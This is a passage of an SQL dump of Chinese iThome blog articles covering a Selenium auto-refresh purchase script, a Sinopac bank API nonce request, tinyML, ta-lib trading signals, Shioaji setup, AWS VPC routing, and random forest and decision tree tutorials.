src="https://ithelp.ithome.com.tw/upload/images/20210911/20133286hOhY95HoCK.png" alt="https://ithelp.ithome.com.tw/upload/images/20210911/20133286hOhY95HoCK.png"></p>\n<p>知道帳號框框的id是memId後，就可以用<em>find_element_by_id()</em> 定位元素了~<br>\n其實也不一定要用id定位，只是這個方法最不會錯，其他定位方式可以看<a href="https://selenium-python.readthedocs.io/locating-elements.html" target="_blank">Selenium官方文件</a>喔~</p>\n<ul>\n<li>點擊</li>\n</ul>\n<pre><code>driver.find_element_by_class_name(''login'').click()\n</code></pre>\n<p>輸入完帳號密碼要點擊下方的登入，我這邊用的定位方式是class name，<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210911/20133286yQeNi3IyvO.png" alt="https://ithelp.ithome.com.tw/upload/images/20210911/20133286yQeNi3IyvO.png"></p>\n<ul>\n<li>顯性等待</li>\n</ul>\n<pre><code>WebDriverWait(driver, 1, 0.5).until(EC.presence_of_element_located((By.ID, ''buy_yes'')))\n</code></pre>\n<p>進入PS5購買頁面會看到<strong>可訂購時通知我</strong>的按鍵 (不可購買)<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210911/20133286nR570Xcg1N.png" alt="https://ithelp.ithome.com.tw/upload/images/20210911/20133286nR570Xcg1N.png"><br>\n所以我們要用<strong>顯性等待</strong>方式，每0.5秒刷新一次頁面，直到偵測到<strong>直接購買</strong>按鈕為止<br>\n那要怎麼得到<strong>直接購買</strong>按鈕的id呢? 去別的商品頁面看就可以囉~<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210911/201332867fQPXZkwDk.png" alt="https://ithelp.ithome.com.tw/upload/images/20210911/201332867fQPXZkwDk.png"></p>\n<p><strong>完整程式碼(不含結帳部分)</strong></p>\n<pre><code>from selenium import webdriver\nimport time\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\noptions = webdriver.ChromeOptions()\nprefs = {\n    ''profile.default_content_setting_values'':\n        {\n            ''notifications'': 2\n        }\n}\noptions.add_experimental_option(''prefs'', prefs) \noptions.add_argument("disable-infobars") \n\ndriver = webdriver.Chrome(options=options)\ndriver.maximize_window() \n\ndriver.get("https://m.momoshop.com.tw/mymomo/login.momo") # 到登入頁面\n\ndriver.find_element_by_id(''memId'').send_keys(''帳號'') # 輸入帳號\ndriver.find_element_by_id(''passwd'').send_keys(''密碼'') # 輸入密碼\ndriver.find_element_by_class_name(''login'').click()\n\ndriver.get("https://www.momoshop.com.tw/goods/GoodsDetail.jsp?i_code=8267514&amp;str_category_code=2900100474")\n#driver.get("https://www.momoshop.com.tw/goods/GoodsDetail.jsp?i_code=8820259&amp;mdiv=shopCart")\n\nwhile 1:\n    try:\n        buy = WebDriverWait(driver, 1, 0.5).until(EC.presence_of_element_located((By.ID, ''buy_yes''))) # 顯性等待\n        buy.click() # 偵測到可以購買按鈕就點擊按鈕\n        print (''可以購買!'')\n        break # 後面結帳部分就不寫囉\n    except:\n        print("還不能購買! 重新整理!")\n        driver.refresh() # 重整頁面\n</code></pre>\n<p><strong>成果發表會從缺</strong></p>\n<p>因為PS5一直都沒補貨，加上我也沒錢買，所以這次沒有成果發表會喔哈哈</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-09-13 12:18:52');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259197','利用python取得永豐銀行API的Nonce','串接生活與金融 API','1',replace('\n                        <div class="markdown__style">\n                                                            <p>在報名後，收到了永豐銀行寄來的"數位金流API技術規格文件"，夾檔還附加了 PHP 與 C# 的範例程式。</p>\n<p>太好了，因為我準備用 Python 呼叫 API，如果寄來的夾檔是 python 程式碼；<br>\n那我第一天就沒法子混過去了。</p>\n<p>金融業的API串接，比我想像中還要麻煩些；至少比起我之前串接交通部或是 GCP 服務的API，還要更多程序；<br>\n這是法令所規定的，抄錄其中一小段文字如下：</p>\n<p>本規格交易安控設計依據「電子銀行業務安全控管作業基準」之規範訂定如下：<br>\n➢安全簽章（Sign）：為確保交易不可否認生，發動交易請求時需完成訊息內文規則性雜湊及其他參數，在將雜湊後字串用SHA256 Hash產生出來。</p>\n<p>➢內文加密機制（Message）：本規格採用AES 演算CBC 模式將訊息內文加密，來確保傳送內文之機敏資料不外洩，反之於接收交易回應時，將收到的加密內文以相同規則作解密。</p>\n<p>好吧，總之第一個要取得的是 "Nonce" 參數。這還不簡單，用個 Post 方法來取就可以啦；<br>\n所以我很開心的用下列的程式碼：</p>\n<pre><code>import requests\n\n# ShopNo 由主辦單位提供，此處示例以 xxx 取代\ndata = {''ShopNo'':"xxx"}\n\nURL ="https://apisbx.sinopac.com/funBIZ/QPay.WebAPI/api/Nonce"\nr = requests.post(url = URL, data = data)\n\nr.status_code\n# 401 !!!\n\nr.text\n# "&lt;html&gt;&lt;head&gt;&lt;title&gt;Request Rejected&lt;/title&gt;&lt;/head&gt;&lt;body&gt;The requested URL was rejected. Please consult with your administrator.&lt;br&gt;&lt;br&gt;Your support ID is: 7822324514163083814&lt;br&gt;&lt;br&gt;&lt;a href=''javascript:history.back();''&gt;[Go Back]&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;"\n\n</code></pre>\n<p>咦! 回應的卻是 "The requested URL was rejected."</p>\n<p>到底是發生了什麼事情吧 ?</p>\n<p>好吧，趕快偷看一下，PHP的範例程式碼，其中一段是這樣寫的</p>\n<pre><code>//取得 Nonce 方法\n	function getNonce($shopno, $targeturl){\n		$url = $targeturl . "/Nonce";\n	\n		$post_data = json_encode(array(''ShopNo'' =&gt; $shopno));\n		$result = WebAPI($url, $post_data);\n		$result = json_decode($result);\n		\n		return $result-&gt;Nonce;\n	}\n</code></pre>\n<p>看到幾個關鍵字  json 、 encode 然後才是送出 POST。<br>\n因為平常使用 requests.post 時，都是利過 data 參數進行資料的傳送；<br>\n趕快查一下 requests.post 還支援了什麼參數。果然真的有支援 json 的參數，因為平常沒有使用，所以真的不知道有什麼用法。所以將上面的程式改成如下</p>\n<pre><code>import requests\n\n# ShopNo 由主辦單位提供，此處示例以 xxx 取代\njson = {''ShopNo'':"xxx"}\n\nURL ="https://apisbx.sinopac.com/funBIZ/QPay.WebAPI/api/Nonce"\nr = requests.post(url = URL, json = json )\n\nr.status_code\n# 200 \nr.text\n# 成功!  ''{"Nonce":"yyyyy"}'' \nr.json()\n# 成功!''{"Nonce":"yyyyy"}'' \n\n\n</code></pre>\n<p>所以還好有 PHP 的範例程式碼，我可以大致推斷自己錯誤的狀況…</p>\n<p>總之，第一天就先這樣吧  :)</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-01 21:08:51');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10264224','[Day 01] 在享受tinyML這道美食之前','爭什麼，把AI和MCU摻在一起做tinyML就對了！','1',replace('\n                        <div class="markdown__style">\n                                                            <p>說到小弟「<strong>史蒂芬周</strong>」可是無人不知無人不曉的「<strong>食神</strong>」，唐朝飲食集團主席，在中國廚藝訓練學院（少林寺）深造過，不僅懂得如何吃一碗好吃的街邊雜碎麵，更把街邊美食「<strong>瀨尿蝦</strong>」和「<strong>牛肉丸</strong>」摻在一起做吃了考試都一百分的「<strong>爆漿瀨尿蝦牛丸</strong>」行銷到全世界，最後還以少林絕學火雲掌創造出讓人難以忘懷、撕心裂肺的「黯然銷魂飯」，當上老爸、老媽、大哥、小妹、男孩、女孩只要有心就能當的「<strong>食神</strong>」。</p>\n<p>這次有幸能參加iThome 2021鐵人賽，所以當然要端出成名代表作好吃、新奇又好玩的「爆漿瀨尿蝦牛丸」(tinyML)和大家分享一下。首先會請出火雞姐示範如何用驚人的雙臂、甩動的舌頭及無比的熱情連續敲打牛肉做出超有彈性的牛肉丸(MCU)，接著會請基哥告訴大家會噴的人一臉的爆漿的瀨尿蝦核心(AI)究竟是如何完成，最後再由小弟說明如何將這個創新產品推向世界，讓厭食症的病患也能喜歡，讓大家都人手一碗街邊美食。</p>\n<p>回到現實，<strong>雲端智慧物聯網</strong>(Artificial Intelligence + Internet of Thing, AI + IoT = <strong>AIoT</strong>)已是非常成熟的產業了，通常會以非常平價的微處理器(Microprocessor, uP)或單晶片(Micro Controller Unit, <strong>MCU</strong>)當作本地端(Local / Edge)的主要核心，接收各式「<strong>感應元件</strong>」（如溫濕度、光照、心率、影像、聲音等）及控制各式「<strong>致動元件</strong>」（LED, 開關、馬達等），接著再利用長短距離「<strong>通訊模組</strong>」（如WiFi, BT, 4G/5G等）來傳送資料和接收命令，最後再和雲端的運算、控制、儲存並和使用者的行動通訊裝置連結就能完成整個AIoT系統。其中所時序預測、維修提醒、異常偵測、影像物件偵測及辨識等智能分析工作通常都交由雲端伺服器來協助完成。</p>\n<p><img src="https://1.bp.blogspot.com/-R8jzLJeNiN0/YULD2eNqRXI/AAAAAAAAEtk/8M8WTfgaL5o_2e9PjcSXGmsNkgpNYX7EQCPcBGAYYCw/s1654/iThome_Day_01_Fig_01.jpg" alt="智慧物聯網架構"><br>\nFig. 1-1 智慧物聯網(AIoT)架構 (OmniXRI整理繪製, 2021/9/9)</p>\n<p>不過在強調「<strong>低延遲反應</strong>」、「<strong>高資料隱私</strong>」、「<strong>低功耗</strong>」、「<strong>低成本</strong>」的需求下**邊緣智能(Edge AI)**的需求就日益增加，所以大家就想把AI的功能加到MCU上，希望藉此能得到又便宜又好用的智能設備。但不幸地是，腳踏車是難以和機車甚至汽車、飛機匹敵的。同樣地要用幾十到幾百元台幣的產品去對抗幾千到幾十萬甚至上千萬台幣的產品更是天方夜譚。所以要認清最適合腳踏車的應用範圍，那就能獲得最大的收益。</p>\n<p>為了讓大家更了解MCU如何實現AI，在接下來的30天會幫大家介紹一項名為「<strong>微機器學習tinyML</strong>」的技術，同時介紹兩大核心技術MCU及AI基本原理，並說明如何實現在Arm Cortex-M系列MCU上及如何應用通用開發平台來完成自定義AI應用。就好比一口吃下爆醬瀨尿蝦牛丸(<strong>tinyML</strong>)就能同時享受牛肉丸(<strong>MCU</strong>)的鮮美、瀨尿蝦(<strong>AI</strong>)的甘甜，更可讓大家在享受美食時一併了解它如何製作及開發出更適合自己口味的新丸子。</p>\n<p>這班tinyML的列車就要出發了，還不趕緊跟上。</p>\n<p>ps. 為讓文章更活潑傳達硬梆梆的技術內容，所以引用了經典電影「食神」的橋段，希望小弟戲劇性的二創不會引起電影公司的不悅，在此對星爺及電影公司致上崇高的敬意，敬請見諒。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Arm Platforms',NULL,'2021-09-16 09:55:21');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259933','[Day3] 使用ta-lib製作指標','從零開始使用python打造簡易投資工具','3',replace('\n                        <div class="markdown__style">\n                                                            <p>延續前一天的程式碼，在程式碼後面加上以下三行程式碼，他就會用前一天做出來的日收盤價計算出均線(預設算出來的是30日均線)<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210903/20141238P1LOK6f9z2.png" alt="https://ithelp.ithome.com.tw/upload/images/20210903/20141238P1LOK6f9z2.png"></p>\n<p>他就會印出<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210903/20141238Q4IYwW0Yph.png" alt="https://ithelp.ithome.com.tw/upload/images/20210903/20141238Q4IYwW0Yph.png"></p>\n<p>如果想要換成其他週期的均線，後面加上",timeperiod=週期"就可以了，像下面的例子就是5日均線<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210903/20141238zVm2CskyOr.png" alt="https://ithelp.ithome.com.tw/upload/images/20210903/20141238zVm2CskyOr.png"></p>\n<p>有長均線和短均線，接著就可以來做長短均線交叉策略，實作概念上不難，就是對每一天做檢查，如果<strong>短均&gt;長均</strong>的時候就是多頭排列，這時候<strong>買進並持有</strong>。如果<strong>短均&lt;長均</strong>的時候就是空頭排列，這時<strong>賣出並空手</strong>。實際上的買賣點是訊號在<strong>短均&gt;長均</strong>變成<strong>短均&lt;長均</strong>的<strong>隔天</strong>賣出(因為訊號是收盤才有的，所以是隔天)，買點則是<strong>短均&gt;長均</strong>變成<strong>短均&lt;長均</strong>的<strong>隔天</strong>。<br>\n用以下程式碼就可以印出買進訊號<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210903/20141238zsHT0AS1XE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210903/20141238zsHT0AS1XE.png"></p>\n<p>以下是執行結果，顯示True的時候買進持有，顯示False的時候賣出並空手<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210903/20141238azkSX1aTwC.png" alt="https://ithelp.ithome.com.tw/upload/images/20210903/20141238azkSX1aTwC.png"></p>\n<p>接下來周末兩天預計會弄完回測的部分並且把這幾天的東西打包成function，之後直接呼叫。順帶一提昨天是登入自己的永豐帳號測試的，今天才發現用測試帳號的資料沒有到兩年，就三~四個月。所以真的要用的話還是開個永豐金證券的帳戶比較好。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-03 22:43:46');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259256','永豐金融API測試員','永豐金融販子','1',replace('\n                        <div class="markdown__style">\n                                                            <p>永豐銀行量身打造逾百支 API，支援消費支付、生活繳費、身分認證與開放銀行等四大面向的 B2C 應用，廣泛運用於零售、電商、電子支付、新創等產業，至今已協助逾千家企業加入 API 串接本行金融服務，盼與跨業合作夥伴落實無所不在的金融服務。</p>\n<p>仔細一看，原來只有消費支付API有提供測試，原本想說 API 類別有4個面向，感覺能做很多不同的事情，既來之則安之。</p>\n<p>反而永豐金證券-Shioaji API (Python API)的部分提供比較完整，有些API還提供2.0版本，功能包括：提供報價、下單、成交回報、帳務查詢。</p>\n<p>那就開始 30 天程式交易初階策略程式吧</p>\n<p>首先安裝步驟</p>\n<p>使用 pip 安裝</p>\n<blockquote>\n<p>pip install shioaji</p>\n</blockquote>\n<p>原本在MAC 開發，發現會出現錯誤，查察之後得知目前不支援 MAC ，只能在 Windows 平台運行...</p>\n<p>好在在 Google Colaboratory 能正常運行，</p>\n<p><a href="https://colab.research.google.com/" target="_blank">Colaboratory</a> (簡稱為「Colab」) 可讓你在瀏覽器上撰寫及執行 Python，且具備下列優點：</p>\n<ul>\n<li>不必進行任何設定</li>\n<li>免費使用 GPU</li>\n<li>輕鬆共用</li>\n</ul>\n<p>另外官方也有提供 Docker Image</p>\n<blockquote>\n<p>docker run -it sinotrade/shioaji:latest</p>\n</blockquote>\n<p>或是用 jupyter lab</p>\n<blockquote>\n<p>docker run -p 8888:8888 sinotrade/shioaji:jupyter</p>\n</blockquote>\n<p>環境設定好之後，接下來就是最重要的事</p>\n<p>交易要怎麼獲利呢？</p>\n<ol>\n<li>買高賣更高</li>\n<li>賣低買更低</li>\n<li>交易要順勢交易</li>\n</ol>\n<p>聽起來就是個廢話</p>\n<p>要怎麼買在低點，賣在高點呢？<br>\n要怎麼賣在高點，買在低點呢？</p>\n<p>這就需要一些判斷，</p>\n<p>比如說壓力與支撐，買在支撐，賣在壓力，好像是不錯的策略</p>\n<p>或是買在接近均價線附近</p>\n<p>接下來就是個別策略實作與介紹了</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-01 22:59:00');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10262172','Day 5 網路寶石：AWS VPC 架構 Routes & Security (上)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','5',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210909/20100951hAu1MvloHI.jpg"></p>\n<h4>兩個 Private Subnet 的溝通方式</h4>\n<p>Private Subnet（下圖#1）是一封閉的網路，也就是它並沒有對外。今天若在 Private Subnet 內放置兩台 EC2（下圖#2），因為這兩台 EC2 在同一個網路空間，故能彼此進行溝通。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951UEBL5362LT.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951UEBL5362LT.png"></p>\n<p>而如果想讓兩個不同的 Private Subnet 內的 EC2 進行溝通時，必須使用到 Route Table（下圖#1）。每一個 Subnet 都會配到一個 Route Table，用於指引網路流量應該怎麼走及要去哪裡。Route Table 上面有兩個重要的設定，一個是目的地 IP（下圖#2），另一個則是下一站（下圖#3）是要先去哪裡。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ysq9U7kJzw.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ysq9U7kJzw.png"></p>\n<p>如果想要從左邊 Subnet 的 EC2 連到右邊 Subnet 的 EC2，概念上可以直接連過去，但實際上必須先經過一個 Local（下圖#1）的中繼站，再往右邊 Subnet 的 EC2 導過去（如下圖橘色實線所示），到達目的地後，會再返回原出發點（如下圖橘色虛線所示）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951UmcJXjmjAQ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951UmcJXjmjAQ.png"></p>\n<h4>Public Subnet 與 Internet 的溝通方式</h4>\n<p>Public Subnet 的目的為讓內部的網路可以與外界 Internet 溝通。要讓Public Subnet 中的 EC2 可以連到 Internet，同樣必須用到 Route Table 來指引路線。此時 Route Table 中的「目的地IP（下圖#1）」即為 Internet，「下一站（下圖#2）」則是一個放置於VPC上的特殊中繼站IGW（Internet Gateway）（下圖#3）。<br>\n若是要從 Public Subnet 中的 EC2 連線到 Internet，必須先經過 IGW，透過 IGW 將網路請求導流到 Internet（如下圖橘色實線所示），到達目的地後，再原路返回（如下圖橘色虛線所示）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951HpzebtJrnE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951HpzebtJrnE.png"></p>\n<h4>Private Subnet 與 Internet 的溝通方式</h4>\n<p>若要讓 Private Subnet 中的 EC2 可以連到 Internet，必須將其 Route Table中的「下一站（下圖#1）」改為放置於 Public Subnet 上的虛擬主機 NAT Gateway，簡稱為 NAT gw（下圖#2）。<br>\n而當在 Private Subnet 中的 EC2 送出網路請求去 Internet，必須先經過 NAT gw（下圖#2），再由 NAT gw 走與 Public Subnet 一樣的路徑（也就是經由 IGW（下圖#3）再到 Internet，如下圖橘色實線所示），到達目的地後，再原路返回（如下圖橘色虛線所示）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OR8ul9SYdt.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OR8ul9SYdt.png"></p>\n<h4>小結</h4>\n<p>那這次，我們了解了 AWS VPC 的網路流通方式，透過 Route Table 的設定並搭配 NAT 與 IGW 來連通內外網。</p>\n<h4>What''s Next?</h4>\n<p>明天，我們將接著介紹「VPC架構 Routes &amp; Security」中網路安全設定的部分！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-10 16:10:58');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10272586','[Day 14] 多棵決策樹更厲害：隨機森林 (Random forest)','全民瘋AI系列2.0','14',replace('\n                        <div class="markdown__style">\n                                                            <h1>隨機森林 (Random forest)</h1>\n<h2>今日學習目標</h2>\n<ul>\n<li>隨機森林介紹\n<ul>\n<li>隨機森林的樹是如何生成？隨機森林的優點？</li>\n<li>隨機森林如何處理分類問題？</li>\n<li>隨機森林如何處理迴歸問題？</li>\n</ul>\n</li>\n<li>實作隨機森林分類器\n<ul>\n<li>比較隨機森林與決策樹兩者差別。</li>\n</ul>\n</li>\n</ul>\n<h2>隨機森林</h2>\n<p>隨機森林其實就是進階版的決策樹，所謂的森林就是由很多棵決策樹所組成。隨機森林是使用 Bagging 加上隨機特徵採樣的方法所產生出來的整體學習演算法。還記得在前幾天的決策樹演算法中，當模型的樹最大深度設定太大的話容易讓模型過擬合。因此隨機森林藉由多棵不同樹的概念所組成，讓結果比較不容易過度擬合，並使得預測能力更提升。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210926/20107247Byu7nDRVKB.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20107247Byu7nDRVKB.png"></p>\n<h2>隨機森林的生成方法</h2>\n<p>首先從訓練集中抽取 n’ 筆資料出來，然而這 n’ 筆資料是可以被重複抽取的。假設我們有一千筆資料我們要從中抽取 100 筆資料出來，這 100 筆資料裡面可能會有重複的數據。接著第二步從這些抽取出來的資料中挑選 k 個特徵當作決策因子的後選，因此每一棵樹只能看見部分的特徵。第三步重複以上步驟 m 次並產生 m 棵決策樹。透過 Bootstrap 步驟重複 m 次，做完之後我們會有 m 組的訓練資料，每一組訓練資料內都有 n’ 筆資料。最後再透過每棵樹的決策並採多數決投票的方式，決定最終預測的類別。因為隨機森林每一棵樹的特徵數量可能都不同，所以最後決策出來的結果都會不一樣。最後再根據任務的不同來做回歸或是分類的問題，如果是回歸問題我們就將這些決策數的輸出做平均得到最後答案，若是分類問題我們則用投標採多數決的方式來整合所有樹預測的結果。</p>\n<ol>\n<li>從訓練集中抽取 n’ 筆資料出來</li>\n<li>n’ 筆資料隨機挑選 k 個特徵做樣本</li>\n<li>重複 m 次，產生 m 棵決策樹</li>\n<li>分類: 多數投票機制進行預測、迴歸: 平均機制進行預測</li>\n</ol>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210926/20107247LIQe1bQNz1.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20107247LIQe1bQNz1.png"></p>\n<h2>隨機森林中的隨機？</h2>\n<p>隨機森林中的隨機有兩種方面可以解釋。首先第一個是隨機取樣，在模型訓練的過程中每棵樹的生成都會先從訓練集中隨機抽取 n’ 筆資料出來，而這 n’ 筆資料是可以被重複抽取的。此抽取資料的方式又稱為 Bootstrap，它是一種在統計學上常用的資料估計方法。第二個解釋隨機的理由是在隨機森林中每一棵樹都是隨機的特徵選取。每一棵樹都是從 n’ 筆資料中隨機挑選 k 個特徵做樣本。</p>\n<blockquote>\n<p>在 sklearn 中，最多隨機選取 log2N 個特徵</p>\n</blockquote>\n<h2>隨機森林的優點</h2>\n<ul>\n<li>每棵樹會用到哪些訓練資料及特徵都是由隨機決定</li>\n<li>採用多個決策樹的投票機制來改善決策樹</li>\n<li>與決策樹相比，不容易過度擬合</li>\n<li>隨機森林每一棵樹都是獨立的</li>\n<li>訓練或是預測的階段每一棵樹都能平行化的運行</li>\n</ul>\n<h2>[程式實作]</h2>\n<h2>隨機森林(分類器)</h2>\n<p>Parameters:</p>\n<ul>\n<li>n_estimators: 森林中樹木的數量，預設=100。</li>\n<li>max_features: 劃分時考慮的最大特徵數，預設auto。</li>\n<li>criterion: 亂度的評估標準，gini/entropy。預設為gini。</li>\n<li>max_depth: 樹的最大深度。</li>\n<li>splitter: 特徵劃分點選擇標準，best/random。預設為best。</li>\n<li>random_state: 亂數種子，確保每次訓練結果都一樣，splitter=random 才有用。</li>\n<li>min_samples_split: 至少有多少資料才能再分</li>\n<li>min_samples_leaf: 分完至少有多少資料才能分</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: 預測成功的比例。</li>\n<li>predict_proba: 預測每個類別的機率值。</li>\n<li>get_depth: 取得樹的深度。</li>\n</ul>\n<pre><code class="language-py">from sklearn.ensemble import RandomForestClassifier\n\n# 建立 Random Forest Classifier 模型\nrandomForestModel = RandomForestClassifier(n_estimators=100, criterion = ''gini'')\n# 使用訓練資料訓練模型\nrandomForestModel.fit(X_train, y_train)\n# 使用訓練資料預測分類\npredicted = randomForestModel.predict(X_train)\n</code></pre>\n<h3>使用Score評估模型</h3>\n<p>我們可以直接呼叫 <code>score()</code> 直接計算模型預測的準確率。</p>\n<pre><code class="language-py"># 預測成功的比例\nprint(''訓練集: '',randomForestModel.score(X_train,y_train))\nprint(''測試集: '',randomForestModel.score(X_test,y_test))\n</code></pre>\n<p>輸出結果：</p>\n<pre><code>訓練集:  1.0\n測試集:  0.8888888888888888\n</code></pre>\n<p>我們可以查看訓練好的模型在測試集上的預測能力，下圖中左邊的是測試集的真實分類，右邊的是模型預測的分類結果。由於訓練資料筆數不多，因此模型訓練容易過度擬合訓練集的分布。最終在測試及預測的表現上僅有 0.88 的準確率。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210926/201072477ibkZGCdv9.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/201072477ibkZGCdv9.png"></p>\n<h3>特徵重要程度</h3>\n<p>只要是決策樹系列演算法，不管是分類器或是迴歸器都能透過 <code>feature_importances_</code> 來檢視模型預測對於特徵的重要程度。</p>\n<pre><code class="language-py">print(''特徵重要程度: '',randomForestModel.feature_importances_)\n</code></pre>\n<p>輸出結果：</p>\n<pre><code>特徵重要程度:  [0.09864249 0.01363871 0.44211602 0.44560278]\n</code></pre>\n<h2>隨機森林(回歸器)</h2>\n<p>Parameters:</p>\n<ul>\n<li>n_estimators: 森林中樹木的數量，預設=100。</li>\n<li>max_features: 劃分時考慮的最大特徵數，預設auto。</li>\n<li>criterion: 評估切割點指標，mse/mae。</li>\n<li>max_depth: 樹的最大深度。</li>\n<li>splitter: 特徵劃分點選擇標準，best/random。預設為best。</li>\n<li>random_state: 亂數種子，確保每次訓練結果都一樣，splitter=random 才有用。</li>\n<li>min_samples_split: 至少有多少資料才能再分</li>\n<li>min_samples_leaf: 分完至少有多少資料才能分</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測。</li>\n<li>score: 預測成功的比例。</li>\n<li>get_depth: 取得樹的深度。</li>\n</ul>\n<pre><code class="language-py">from sklearn.ensemble import RandomForestRegressor\n\n# 建立RandomForestRegressor模型\nrandomForestModel = RandomForestRegressor(n_estimators=100, criterion = ''mse'')\n# 使用訓練資料訓練模型\nrandomForestModel.fit(x, y)\n# 使用訓練資料預測\npredicted=randomForestModel.predict(x)\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210926/20107247e9ZML1jGnd.png" alt="https://ithelp.ithome.com.tw/upload/images/20210926/20107247e9ZML1jGnd.png"></p>\n<p>本系列教學內容及範例程式都可以從我的 <a href="https://github.com/andy6804tw/2021-13th-ironman" target="_blank">GitHub</a> 取得！</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'AI & Data',NULL,'2021-09-26 17:16:07');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10271143','[Day 12] 決策樹 (Decision tree)','全民瘋AI系列2.0','12',replace('\n                        <div class="markdown__style">\n                                                            <h1>決策樹 (Decision tree)</h1>\n<h2>今日學習目標</h2>\n<ul>\n<li>決策樹演算法介紹\n<ul>\n<li>決策樹如何生成？</li>\n<li>如何處理分類問題？</li>\n<li>如何處理迴歸問題？</li>\n</ul>\n</li>\n<li>實作決策樹分類器\n<ul>\n<li>觀察決策樹是如何生成的。</li>\n</ul>\n</li>\n<li>實作決策樹迴歸器\n<ul>\n<li>查看決策樹方法在簡單線性迴歸和非線性迴歸表現。</li>\n</ul>\n</li>\n</ul>\n<h2>決策樹</h2>\n<p>決策樹會根據訓練資料產生一棵樹，依據訓練出來的規則來對新樣本進行預測。決策樹演算法可以使用不同的方式來評估分枝的好壞(亂度)，例如像是 Information gain、Gain ratio、Gini index。依據訓練資料找出合適的規則，最終生成一個規則樹來決策所有事情，其目的使每一個決策能夠使訊息增益最大化。就好比我們評估今天比賽是否舉行，天氣因子可能站比較大的因素，而 Co2 的濃度高低可能站的因子程度較低。因此在第一層的決策中以天氣的特徵先進行第一次的決策判斷。接著第二層再從所有特徵中尋找最適合的決策因子，直到設定的最大樹的深度即停止樹的生長。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/201072476CHqRkXf16.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/201072476CHqRkXf16.png"></p>\n<h2>決策樹如何生成？</h2>\n<p>決策樹是以一個貪婪法則來決定每一層要問什麼問題，目標是分類過後每一群能夠很明顯的知道是屬於哪一種類別。延續上面的例子，以分類問題來說假設要評估明天比賽是否舉行。在樹的第一層節點中我們要從已知的兩個特徵分別是溫度與特徵選一個作為該層的決策因子。假設目前訓練集有五筆資料，其中正常舉行的有後筆資料，取消舉行的有三筆資料。在樹的結構中左子樹為決策正常取行，而右子樹是決策取消舉行。我們可以發現當特徵為天氣的時候可以一很清楚的將這兩類別完整分開，因此我們會將天氣作為這一層判斷的因子。這就是決策樹在生成中的貪婪機制。然而要如何去判斷每次決策的好壞，就必須依靠亂度的評估指標。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210924/20107247ZEfzbnhMZY.png" alt="https://ithelp.ithome.com.tw/upload/images/20210924/20107247ZEfzbnhMZY.png"></p>\n<h2>決策樹的混亂評估指標</h2>\n<p>我們需要客觀的標準來決定決策樹的每個分支，因此我們需要有一個評斷的指標來協助我們決策。決策樹演算法可以使用不同的指標來評估分枝的好壞，常見的決策亂度評估指標有 Information gain、Gain ratio、Gini index。我們目標是從訓練資料中找出一套決策規則，讓每一個決策能夠使訊息增益最大化。以上的指標都是在衡量一個序列中的混亂程度，其數值越高代表越混亂。然而在 Sklearn 套件中預設使用 